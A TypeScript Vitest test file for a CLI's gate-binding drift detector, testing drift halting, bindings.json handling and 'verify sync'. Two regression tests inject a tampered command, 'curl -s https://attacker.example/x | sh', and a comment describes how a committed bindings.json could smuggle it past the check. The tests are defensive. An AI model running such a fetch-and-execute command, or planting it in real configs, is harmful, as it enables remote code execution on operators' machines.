import { afterEach, describe, expect, it } from "vitest";
import { discover } from "../../src/adapter/discover/index.js";
import {
  DRIFT_EXIT_CODE,
  DriftHaltError,
  assertNoDrift,
  checkBinding,
  finalize,
  readBindings,
  writeBindings,
} from "../../src/adapter/drift.js";
import { bindAll, type GateRunner } from "../../src/adapter/bind.js";
import { EXIT_NOT_READY, EXIT_OK, verifySync } from "../../src/cli/verify.js";
import { initLayout } from "../../src/fs/layout.js";
import type { Binding } from "../../src/schemas/records.js";
import { removeTree, tmpTree, writeTree } from "../helpers.js";

/** T-027 — drift halting (V-3), region precision, and `verify sync` (C-12). */

const trees: string[] = [];
const tree = (files: Record<string, string>): string => {
  const root = tmpTree(files);
  trees.push(root);
  initLayout(root);
  return root;
};
afterEach(() => {
  for (const t of trees.splice(0)) removeTree(t);
});

const NOW = () => "2026-08-18T09:00:00.000Z";
const runner: GateRunner = async (spec) => ({
  slot: spec.slot,
  command: spec.command,
  cwd: spec.cwd,
  outcome: "exited",
  green: true,
  exitCode: 0,
  signal: null,
  normalizedExit: 0,
  output: "",
  outputBytes: 0,
  truncated: false,
  durationMs: 1,
});

const FIXTURE = {
  "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run", lint: "eslint ." } }, null, 2),
  "package-lock.json": "{}\n",
};

async function bound(root: string): Promise<Binding[]> {
  const report = await bindAll(discover(root), { root, runner, now: NOW , redact: (t) => t });
  return [...report.bindings];
}

describe("T-027 V-3 drift halting", () => {
  it("editing the defining region halts, naming both hashes", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    expect(assertNoDrift(bindings, discover(root)).halting).toEqual([]);

    writeTree(root, {
      "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --coverage", lint: "eslint ." } }, null, 2),
    });

    let thrown: DriftHaltError | null = null;
    try {
      assertNoDrift(bindings, discover(root));
    } catch (err) {
      thrown = err as DriftHaltError;
    }
    expect(thrown).toBeInstanceOf(DriftHaltError);
    expect(thrown?.exitCode).toBe(DRIFT_EXIT_CODE);
    expect(thrown?.exitCode).toBe(2);

    const stored = bindings.find((b) => b.slot === "test")!.config_hash;
    const current = discover(root).candidates.find((c) => c.slot === "test")!.config_hash;
    expect(thrown?.message).toContain(stored);
    expect(thrown?.message).toContain(current);
    expect(thrown?.message).toContain("verification changed — re-baseline");
  });

  it("editing a non-gate region does not halt (region precision)", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    writeTree(root, {
      "package.json": JSON.stringify(
        { name: "svc", version: "2.0.0", scripts: { test: "vitest run", lint: "eslint . --max-warnings 0" } },
        null,
        2,
      ),
    });

    const check = checkBinding(bindings.find((b) => b.slot === "test")!, discover(root));
    expect(check.status).toBe("clean");
    /** The lint binding *did* drift; precision means the test gate is unaffected. */
    expect(checkBinding(bindings.find((b) => b.slot === "lint")!, discover(root)).status).toBe("drifted");
  });

  /**
   * SEC-5′ (PRDR-134) — the check guards the COMMAND, not only the config it
   * came from.
   *
   * `bindings.json` is committed repository content and `resolved` is the only
   * field that executes: `referee-gate.ts` hands it to `spawn(..., { shell:
   * true })` with the operator's full environment. Drift compared `config_hash`
   * alone, and `config_hash` is computable from the repository's own config
   * region — so an attacker ships an ordinary `package.json`, computes the hash
   * that region yields, and commits a binding pairing that VALID hash with any
   * command they like. Drift reported clean and the first gate ran it.
   */
  /**
   * PRDR-149. `binding.resolved` is the NORMALIZED command (`bind.ts` stores
   * `invocation.command`); `Candidate.resolved` is the literal one. Comparing
   * them directly halted every repository whose test script is a watch-mode
   * runner — `"test": "vitest"` binds as `npm run test -- --run` and discovers
   * as `npm run test` — so an untouched `npm create vite` project drifted on
   * its first gate, unrecoverably, since `verify sync` re-binds through the
   * same normalizer.
   *
   * The PRDR-134 test below did not catch it because its fixture is already
   * CI-safe, which makes normalization a no-op.
   */
  it("a watch-mode test script does not drift on an untouched repo", async () => {
    const root = tree({ "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest", lint: "eslint ." } }, null, 2) });
    const bindings = await bound(root);
    expect(bindings.find((b) => b.slot === "test")?.resolved).toContain("--run");
    expect(() => assertNoDrift(bindings, discover(root)), "an untouched repo must not halt").not.toThrow();
  });

  /**
   * PRDR-149. `checkBinding` returned `exempt` for a provisional binding BEFORE
   * any comparison, `exempt` is not in the halting filter, and
   * `runScopedGates` never looks at status — so one extra field in a committed
   * `bindings.json` bypassed the command check entirely. Being exempt from
   * DRIFT (no approved baseline to have drifted from) does not mean the command
   * need not be the one discovery found.
   */
  it("a provisional binding is exempt from drift but NOT from the command check", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    const payload = "curl -s https://attacker.example/x | sh";
    const tampered = bindings.map((b) => (b.slot === "test" ? { ...b, resolved: payload, status: "provisional" as const } : b));
    expect(() => assertNoDrift(tampered, discover(root)), "provisional must not exempt the command").toThrow(DriftHaltError);
    /* And a provisional binding whose command IS what discovery finds stays exempt. */
    const honest = bindings.map((b) => (b.slot === "test" ? { ...b, status: "provisional" as const } : b));
    expect(() => assertNoDrift(honest, discover(root))).not.toThrow();
  });

  it("a substituted `resolved` halts even when its config_hash still validates", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    expect(assertNoDrift(bindings, discover(root)).halting).toEqual([]);

    /* The repository's config is untouched, so every config_hash still matches. */
    const tampered = bindings.map((b) =>
      b.slot === "test" ? { ...b, resolved: "curl -s https://attacker.example/x | sh" } : b,
    );

    let thrown: DriftHaltError | null = null;
    try {
      assertNoDrift(tampered, discover(root));
    } catch (err) {
      thrown = err as DriftHaltError;
    }
    expect(thrown, "a substituted command must halt, not execute").toBeInstanceOf(DriftHaltError);
    /* The message names the command, which is what an operator needs to see. */
    expect(thrown?.message).toContain("curl -s https://attacker.example/x | sh");
    expect(thrown?.message).toContain("COMMAND");
  });

  it("a binding whose configuration vanished halts too", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { lint: "eslint ." } }, null, 2) });

    const check = checkBinding(bindings.find((b) => b.slot === "test")!, discover(root));
    expect(check.status).toBe("vanished");
    expect(check.current_hash).toBeNull();
    expect(() => assertNoDrift(bindings, discover(root))).toThrow(DriftHaltError);
  });

  it("provisional bindings are exempt until C-4 finalises them", async () => {
    const root = tree(FIXTURE);
    const report = await bindAll(discover(root), { root, runner, now: NOW, status: "provisional" , redact: (t) => t });
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --ui" } }, null, 2) });

    const check = checkBinding(report.bindings.find((b) => b.slot === "test")!, discover(root));
    expect(check.status).toBe("exempt");
    expect(() => assertNoDrift([...report.bindings], discover(root))).not.toThrow();
  });

  it("finalising takes the current hash as the baseline (C-4)", async () => {
    const root = tree(FIXTURE);
    const report = await bindAll(discover(root), { root, runner, now: NOW, status: "provisional" , redact: (t) => t });
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --coverage" } }, null, 2) });

    const finalized = finalize(report.bindings.find((b) => b.slot === "test")!, discover(root));
    expect(finalized.status).toBe("approved");
    expect(checkBinding(finalized, discover(root)).status).toBe("clean");
  });
});

describe("T-027 bindings.json", () => {
  it("round-trips through the committed artifact, stamped (F-3)", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    writeBindings(root, { bindings, skips: [{ slot: "e2e", acknowledged_by: "alice", at: NOW() }] });

    const read = readBindings(root);
    expect(read.schema_version).toBe(1);
    expect(read.bindings).toEqual(bindings);
    expect(read.skips).toEqual([{ slot: "e2e", acknowledged_by: "alice", at: NOW() }]);
  });

  it("a missing file reads as empty rather than throwing", () => {
    const root = tree(FIXTURE);
    expect(readBindings(root).bindings).toEqual([]);
  });

  it("a newer-schema file is refused, never read (F-3)", () => {
    const root = tree(FIXTURE);
    writeTree(root, { ".detent/bindings.json": JSON.stringify({ schema_version: 99, bindings: [] }) });
    expect(() => readBindings(root)).toThrow(/schema_version 99/);
  });
});

describe("T-027 `verify sync` (C-12)", () => {
  it("re-runs V-1 with consent and re-baselines", async () => {
    const root = tree(FIXTURE);
    writeBindings(root, { bindings: await bound(root), skips: [] });
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --coverage", lint: "eslint ." } }, null, 2) });

    let offered: number | null = null;
    const result = await verifySync(root, {
      consent: async (summary) => {
        offered = summary.drift.filter((d) => d.status === "drifted").length;
        return true;
      },
      bind: (discovery, opts) => bindAll(discovery, { ...opts, runner, now: NOW , redact: (t) => t }),
      now: NOW,
    });

    expect(offered).toBe(1);
    expect(result.exitCode).toBe(EXIT_OK);
    expect(result.rebaselined).toBe(true);
    expect(assertNoDrift(readBindings(root).bindings, discover(root)).halting).toEqual([]);
  });

  it("declining leaves the bindings untouched and exits 2", async () => {
    const root = tree(FIXTURE);
    const original = await bound(root);
    writeBindings(root, { bindings: original, skips: [] });
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --coverage", lint: "eslint ." } }, null, 2) });

    const result = await verifySync(root, {
      consent: async () => false,
      bind: (discovery, opts) => bindAll(discovery, { ...opts, runner, now: NOW , redact: (t) => t }),
    });

    expect(result.exitCode).toBe(EXIT_NOT_READY);
    expect(result.rebaselined).toBe(false);
    expect(readBindings(root).bindings).toEqual(original);
    expect(result.messages.join(" ")).toContain("declined");
  });

  it("executes the replacement candidates before offering them (V-1, P4)", async () => {
    const root = tree(FIXTURE);
    writeBindings(root, { bindings: await bound(root), skips: [] });

    const executed: string[] = [];
    await verifySync(root, {
      consent: async () => true,
      bind: (discovery, opts) =>
        bindAll(discovery, {
          ...opts,
          now: NOW,
          runner: async (spec) => {
            executed.push(spec.command);
            return runner(spec);
          },
        }),
    });
    expect(executed).toEqual(["npm run test", "npm run lint"]);
  });

  it("refuses to sync while a slot is ambiguous", async () => {
    const root = tree({ ...FIXTURE, Makefile: "test:\n\techo hi\n" });
    const result = await verifySync(root, {
      consent: async () => true,
      bind: (discovery, opts) => bindAll(discovery, { ...opts, runner, now: NOW , redact: (t) => t }),
    });
    expect(result.exitCode).toBe(EXIT_NOT_READY);
    expect(result.messages.join(" ")).toContain("plausible candidates");
  });

  it("keeps recorded skips across a re-baseline", async () => {
    const root = tree(FIXTURE);
    writeBindings(root, { bindings: await bound(root), skips: [{ slot: "e2e", acknowledged_by: "alice", at: NOW() }] });
    await verifySync(root, {
      consent: async () => true,
      bind: (discovery, opts) => bindAll(discovery, { ...opts, runner, now: NOW , redact: (t) => t }),
    });
    expect(readBindings(root).skips).toEqual([{ slot: "e2e", acknowledged_by: "alice", at: NOW() }]);
  });
});
